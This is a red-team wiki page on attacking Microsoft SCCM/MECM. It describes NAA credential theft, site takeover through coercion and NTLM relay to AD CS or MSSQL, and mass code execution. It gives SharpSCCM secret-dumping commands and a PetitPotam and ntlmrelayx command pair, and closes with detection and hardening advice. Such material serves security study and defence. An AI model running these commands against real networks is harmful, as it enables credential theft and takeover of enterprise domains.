---
title: SCCM / MECM tradecraft
slug: sccm-misconfiguration-manager
---

> **TL;DR:** Microsoft Configuration Manager (SCCM/MECM) is an under-defended path to enterprise compromise — NAA credentials in policy, distribution-point creds, automatic-client-push relay, and site-takeover via PXE or relay are the headline primitives.

## What it is
Configuration Manager is Microsoft's endpoint management product for software deployment, OS imaging, and inventory. Its architecture (site servers, management points, distribution points, clients, SQL backend) accumulates highly privileged credentials and trust relationships that attackers can flip into domain compromise. The Misconfiguration-Manager project (subat0mik / Garrett Foster / Chris Thompson) catalogues the attack taxonomy as CRED-#, ELEVATE-#, EXEC-#, TAKEOVER-#, RECON-#.

## Preconditions / where it applies
- An AD-integrated SCCM deployment (vast majority of enterprise)
- Some foothold: domain user, a workstation enrolled as SCCM client, or network access to a management point / distribution point
- Recon: identify site code, site server, management point — `\\<MP>\SMS_<sitecode>\` over SMB, or LDAP query for `SMS-Site-*` objects

## Technique
**CRED — credential theft.**
- **NAA (Network Access Account):** stored in policy fetched by every client. Decryptable from local `WMI`/`CIM`. Many orgs use a domain admin for NAA. Instant DA from any client.
- **Task Sequence variables / collection variables:** scripts and TS body can contain admin credentials in cleartext.
- **Distribution Point creds:** PXE password and Reserved-Client-Push account often reused org-wide.

```
SharpSCCM.exe get naa
SharpSCCM.exe get secrets        # task sequences, collection variables
```

**TAKEOVER — site server compromise.**
- Coerce the site server (via PetitPotam / PrinterBug / DFSCoerce) to authenticate to your relay, relay to AD CS for a cert → S4U2Self to site-server machine account → SYSTEM on site server.
- Coerce the site server to authenticate to the SMS Provider's SMB share, relay to SMB on the management point with admin → arbitrary writes.
- Passive site server relay: coerce → relay to the primary site server's MSSQL → escalate via xp_cmdshell.

**EXEC — code execution at scale.**
- Application deployment: create an application targeting a device collection, run as SYSTEM on every client.
- CMPivot: query and run scripts on clients in real time. Requires Application Administrator role.
- Run Script feature: deploy PowerShell to collections instantly. Useful for lateral fan-out.

**ELEVATE / RECON.**
- ELEVATE-1: client push installation account — when SCCM tries to install the client on a new device, it authenticates with this account; coerce / spoof the device, capture/relay.
- RECON: site database read-only access via `SMS_<sitecode>` SQL view, dumps every client, every cred reference.

**Coercion plumbing.**

```
# Coercion + relay → cert via AD CS → S4U
PetitPotam.py -u low -p Passw0rd! -d corp.local relay-host site-server
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## Detection and defence
- Defender for Identity surfaces NTLM relay, AD CS abuse, coercion patterns
- SCCM hardening: enable PKI for client comms, disable NTLM fallback, use a dedicated NAA with minimal rights, enable Enhanced HTTP, store collection vars as secret type
- Monitor SQL audit on the SCCM database for unusual queries against `vSMS_R_System`, `vSMS_R_User`
- Network restrict management point / distribution point comms to client subnets
- Most importantly: do not use a domain admin as NAA — period

## References
- [Misconfiguration-Manager](https://github.com/subat0mik/Misconfiguration-Manager) — canonical attack taxonomy
- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) — offensive toolkit by Chris Thompson
- [SpecterOps blog](https://posts.specterops.io/) — SCCM site takeover write-ups
- [[ad-recon-low-noise]] [[opsec-fundamentals]]
